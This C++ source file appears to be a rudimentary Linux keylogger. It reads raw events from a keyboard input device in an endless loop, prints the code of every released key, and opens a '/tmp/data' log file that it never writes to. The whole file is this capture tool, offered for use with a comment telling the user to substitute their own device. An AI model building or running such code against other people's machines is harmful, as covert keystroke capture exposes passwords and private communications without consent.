#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE "/tmp/data"

int main(int argc, char** argv){
    struct input_event ev;
    int fd = open("/dev/input/event23", O_RDONLY); //Replace with your keyinput log file (eg. event3) 
    FILE* fp = fopen(LOGFILE, "a");
    while(true){
        read(fd, &ev, sizeof(ev));
        if((ev.type == EV_KEY) && (ev.value == 0)){
            std::cout << ev.code << std::endl;
        }
    }
}